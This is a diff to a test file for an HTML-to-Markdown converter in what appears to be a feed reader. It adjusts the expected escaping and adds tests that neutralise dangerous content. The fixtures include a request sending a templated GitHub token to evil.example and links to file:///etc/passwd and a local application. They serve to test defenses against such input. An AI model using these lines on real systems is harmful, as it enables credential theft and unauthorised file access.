@@ -47,10 +47,10 @@ describe("reading feeds", () => {
       [
         "SvelteKit 3 is here! Check out the [announcement post](https://svelte.dev/blog/sveltekit-3-is-here) for the highlights, then run [`sv migrate`](https://svelte.dev/docs/cli/sv-migrate) to handle most of the upgrade for you.",
         "## What’s new in SvelteKit 3",
-        "- Adapters now receive the Svelte config as a function argument (**3.0.0-next.27**, [#16986](https://github.com/sveltejs/kit/pull/16986))\n- Adapters can override `getRequest` during `vite dev`",
+        "- Adapters now receive the Svelte config as a function argument (**3.0.0-next.27**, [\\#16986](https://github.com/sveltejs/kit/pull/16986))\n- Adapters can override `getRequest` during `vite dev`",
       ].join("\n\n"),
     );
-    expect(await markdown(second.html, second.base)).toBe("Today we’re releasing SvelteKit 3. *Upgrading* takes one command:\n\n```sh\nnpx sv migrate sveltekit-3\n```");
+    expect(await markdown(second.html, second.base)).toBe("Today we’re releasing SvelteKit 3. *Upgrading* takes one command:\n\n```\nnpx sv migrate sveltekit-3\n```");
     expect(feed.posts.some((post) => post.audio)).toBe(false);
   });
 
@@ -177,7 +177,7 @@ describe("HTML as Markdown", () => {
     expect(await markdown(html, "https://example.com/post/")).toBe(
       [
         "## Title",
-        "A \\#tag, \\@someone, \\$x\\$, =\\=this=\\=, \\*stars\\*, \\[brackets\\] and a_snake_case word, at **no** cost: $5.",
+        "A \\#tag, \\@someone, \\$x\\$, \\=\\=this\\=\\=, \\*stars\\*, \\[brackets] and a_snake_case word, at **no** cost: \\$5.",
         "\\# Not a heading\n\\- not a list\n1\\. nor this",
         "- One\n  - Nested\n- Two",
         "3. Third\n4. Fourth",
@@ -188,6 +188,25 @@ describe("HTML as Markdown", () => {
         "Some `` code with `ticks` `` and ~~gone~~ *spaced* .",
       ].join("\n\n"),
     );
+  });
+
+  test("a block within a line stays in it: code as code, anything else as its words", async () => {
+    const html = `
+      <div>Read this<i><pre>[Open](file:///System/Applications/Calculator.app)\n@[Secret] #tag $x$ [[New note]]</pre></i> now.</div>
+      <div>x <a><pre>[click](file:///etc/passwd)</pre></a> y <b><pre>---\n# Heading</pre></b></div>
+      <div>Intro <span><h2>## Two</h2><ul><li>- item</li></ul><blockquote>&gt; quote</blockquote></span> end</div>`;
+    expect(await markdown(html)).toBe(
+      [
+        "Read this *`[Open](file:///System/Applications/Calculator.app) @[Secret] #tag $x$ [[New note]]`* now.",
+        "x `[click](file:///etc/passwd)` y **`--- # Heading`**",
+        "Intro \\## Two \\- item \\> quote end",
+      ].join("\n\n"),
+    );
+  });
+
+  test("code is shown without its language, so nothing draws or runs it", async () => {
+    const html = `<pre class="language-http">GET https://evil.example/collect?k={{github}}</pre><pre><code class="language-mermaid">graph TD; A--&gt;B</code></pre><pre>\`\`\`js\nnested\n\`\`\`</pre>`;
+    expect(await markdown(html)).toBe(["```\nGET https://evil.example/collect?k={{github}}\n```", "```\ngraph TD; A-->B\n```", "````\n```js\nnested\n```\n````"].join("\n\n"));
   });
 });
 
